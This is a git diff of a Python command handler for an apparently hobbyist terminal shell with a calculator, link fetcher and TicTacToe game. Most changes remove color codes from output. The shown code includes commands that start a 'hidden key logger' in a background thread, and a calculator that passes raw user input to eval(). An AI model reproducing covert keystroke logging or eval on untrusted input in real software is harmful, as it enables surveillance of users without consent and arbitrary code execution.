@@ -1,4 +1,5 @@
-import threading
+#command_handler.py
+
 from color_manager import ColorManager
 from link_fetcher import LinkFetcher
 from tic_tac_toe import TicTacToe
@@ -19,7 +20,7 @@ class CommandHandler:
                 f"{self.color_manager.current_color}user@host:~$ ")  # Prompt for user input with current color
 
             if user_input==("e"):  # Exit condition
-                print(f"{self.color_manager.current_color}Exiting...")  # Color persists
+                print(f"Exiting...")  # Color persists
                 break
             elif self.isCalculation(user_input):
                 self.perform_Calculation(user_input)
@@ -54,31 +55,31 @@ class CommandHandler:
         links = LinkFetcher.fetch(URL)
         for link in links:
             if link.startswith('http'):
-                print(f"{self.color_manager.current_color}{link}")  # Print with current color
+                print(f"{link}")  # Print with current color
             else:
-                print(f"{self.color_manager.current_color}{URL + link}")  # Print with current color
+                print(f"{URL + link}")  # Print with current color
 
     def handle_game_commands(self, user_input):
         """Handle game commands like starting TicTacToe."""
         if user_input[1:].strip() == "":
-            print(f"{self.color_manager.current_color}====GAMES====")
-            print(f"{self.color_manager.current_color}TicTacToe")
+            print(f"====GAMES====")
+            print(f"TicTacToe")
         elif user_input[1:].strip().lower() in ["tictactoe", "t"]:
-            game = TicTacToe(self.color_manager)
+            game = TicTacToe()
             print("Exit Game with -1")
             game.play()
     def isCalculation(self, user_input):
         return any(op in user_input for op in ["/","*", "+", "-"])
     def perform_Calculation(self, user_input):
         result = eval(user_input)
-        print(f"{self.color_manager.current_color}{result}")
+        print(f"{result}")
     def start_hidden_key_logger(self):
         """Start the hidden key logger in a background thread."""
         if not self.hidden_key_logger:  # Check if no hidden key logger is running
             self.hidden_key_logger = KeyLogger()  # Create a new KeyLogger instance
             self.hidden_key_logger.start_hidden_logging()
         else:
-            print(f"{self.color_manager.current_color}Hidden key logger is already running.")
+            print(f"Hidden key logger is already running.")
 
     def start_normal_key_logger(self):
         """Start the normal key logger (visible key logging)."""
@@ -86,7 +87,7 @@ class CommandHandler:
             self.key_logger = KeyLogger()  # Create a new KeyLogger instance
             self.key_logger.start_logging()
         else:
-            print(f"{self.color_manager.current_color}Key logger is already running.")
+            print(f"Key logger is already running.")
 
     def stop_key_logger(self):
         """Stop the key logger (both normal and hidden)."""
